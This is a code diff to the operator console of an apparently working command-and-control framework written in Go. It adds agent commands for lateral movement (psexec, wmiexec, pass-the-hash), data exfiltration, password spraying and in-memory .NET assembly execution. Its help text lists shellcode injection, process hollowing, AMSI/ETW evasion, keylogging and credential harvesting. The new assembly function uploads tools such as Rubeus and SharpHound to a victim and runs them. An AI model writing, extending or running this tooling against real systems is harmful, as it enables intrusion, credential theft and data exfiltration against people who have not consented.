@@ -39,6 +39,9 @@ var agentCommands = []string{
 	"shell", "exec", "cmd", "upload", "download", "screenshot",
 	"ps", "sysinfo", "persist", "sleep", "cd", "kill",
 	"bof", "shellcode", "inject", "hollow", "evasion", "pivot",
+	"assembly", "lateral", "exfil", "initaccess",
+	"wmiexec", "winrm", "psexec", "pth", "portscan", "spray", "netdiscover",
+	"token", "keylog", "socks", "portfwd", "creds",
 	"info", "tasks", "back", "help",
 	"ad-help", "ad-enum-domain", "ad-enum-users", "ad-enum-groups",
 	"ad-enum-computers", "ad-enum-shares", "ad-enum-spns",
@@ -440,6 +443,20 @@ func (sh *Shell) executeAgentCmd(cmd string, args []string) {
 		sh.cmdPortFwd(args)
 	case "creds":
 		sh.cmdCreds(args)
+	case "lateral", "wmiexec", "winrm", "psexec", "pth":
+		if cmd != "lateral" {
+			args = append([]string{cmd}, args...)
+		}
+		sh.queueTask(protocol.TaskLateral, args, nil)
+	case "exfil":
+		sh.queueTask(protocol.TaskExfil, args, nil)
+	case "assembly":
+		sh.cmdAssembly(args)
+	case "initaccess", "portscan", "spray", "netdiscover":
+		if cmd != "initaccess" {
+			args = append([]string{cmd}, args...)
+		}
+		sh.queueTask(protocol.TaskInitAccess, args, nil)
 	default:
 		// Check if it's an AD command
 		if strings.HasPrefix(cmd, "ad-") {
@@ -1135,24 +1152,32 @@ func (sh *Shell) cmdAgentHelp() {
 		{"screenshot", "Capture screenshot"},
 		{"ps", "List running processes"},
 		{"sysinfo", "Get system information"},
-		{"persist <method>", "Install persistence (registry|cron|service)"},
+		{"persist <method>", "Install persistence (12 methods — type 'persist' for list)"},
 		{"sleep <sec> [jitter%]", "Change sleep interval"},
 		{"cd <path>", "Change working directory"},
-		{"kill", "Terminate the agent"},
-		{"info", "Show agent details"},
-		{"tasks", "Show task history for this agent"},
+		{"", ""},
+		{"assembly <path> [args]", "Execute .NET assembly (Seatbelt, Rubeus, etc.)"},
+		{"lateral <method> <args>", "Lateral movement (wmiexec|winrm|psexec|ssh|pth)"},
+		{"exfil <method> <args>", "Data exfiltration (dns|http|icmp|smb|clipboard|browser)"},
+		{"initaccess <cmd> <args>", "Initial access (portscan|spray|enum-smb|vuln-scan)"},
+		{"", ""},
 		{"bof <file> [args]", "Execute Beacon Object File (in-memory)"},
 		{"shellcode <file>", "Execute raw shellcode in-memory"},
 		{"inject <pid> <file>", "Inject shellcode into remote process"},
 		{"hollow <exe> <file>", "Process hollowing (spawn + inject)"},
-		{"evasion", "Re-run evasion (AMSI/ETW/unhook)"},
+		{"evasion [advanced]", "Evasion (AMSI/ETW/unhook/removepe/blockdlls)"},
+		{"", ""},
 		{"pivot <start|stop|list>", "SMB/Unix socket pivot relay"},
-		{"token <steal|make|revert|info>", "Token manipulation (Windows)"},
+		{"token <steal|make|revert>", "Token manipulation (Windows)"},
 		{"keylog [seconds]", "Capture keystrokes (default: 30s)"},
-		{"socks <start|stop> [addr]", "SOCKS5 proxy through agent"},
+		{"socks <start|stop> [port]", "C2-tunneled SOCKS5 proxy (proxychains)"},
 		{"portfwd <local> <remote>", "TCP port forwarding"},
 		{"creds <browser|wifi|ssh|all>", "Credential harvesting"},
 		{"ad-*", "Active Directory commands (type 'ad-help')"},
+		{"", ""},
+		{"kill", "Terminate the agent"},
+		{"info", "Show agent details"},
+		{"tasks", "Show task history for this agent"},
 		{"back", "Return to main menu"},
 	}
 
@@ -1485,6 +1510,41 @@ func (sh *Shell) cmdPortFwd(args []string) {
 		return
 	}
 	sh.queueTask(protocol.TaskPortFwd, args, nil)
+}
+
+func (sh *Shell) cmdAssembly(args []string) {
+	if len(args) == 0 {
+		Info(".NET Assembly Execution:")
+		fmt.Printf("    %sassembly <path> [args]%s          Execute .NET assembly from file\n", colorCyan, colorReset)
+		fmt.Printf("    %sassembly inline <base64> [args]%s Execute from base64 (in-memory)\n", colorCyan, colorReset)
+		fmt.Printf("    %sassembly list%s                   List common assemblies\n", colorCyan, colorReset)
+		fmt.Println()
+		Info("Examples:")
+		fmt.Printf("    assembly C:\\Users\\Public\\Seatbelt.exe -group=all\n")
+		fmt.Printf("    assembly C:\\Users\\Public\\Rubeus.exe kerberoast\n")
+		fmt.Printf("    assembly C:\\Users\\Public\\SharpHound.exe -c All\n")
+		fmt.Printf("    assembly C:\\Users\\Public\\Certify.exe find /vulnerable\n")
+		return
+	}
+
+	// Check if user wants to upload a local file first
+	if args[0] != "inline" && args[0] != "list" {
+		localPath := args[0]
+		// If it's a local file path, read and upload it
+		if data, err := os.ReadFile(localPath); err == nil {
+			remotePath := "C:\\Users\\Public\\" + filepath.Base(localPath)
+			Info("Uploading %s to %s...", filepath.Base(localPath), remotePath)
+			sh.queueTask(protocol.TaskUpload, []string{remotePath}, data)
+
+			// Wait briefly then execute
+			Info("Executing assembly: %s %s", remotePath, strings.Join(args[1:], " "))
+			execArgs := append([]string{remotePath}, args[1:]...)
+			sh.queueTask(protocol.TaskAssembly, execArgs, nil)
+			return
+		}
+	}
+
+	sh.queueTask(protocol.TaskAssembly, args, nil)
 }
 
 func (sh *Shell) cmdCreds(args []string) {
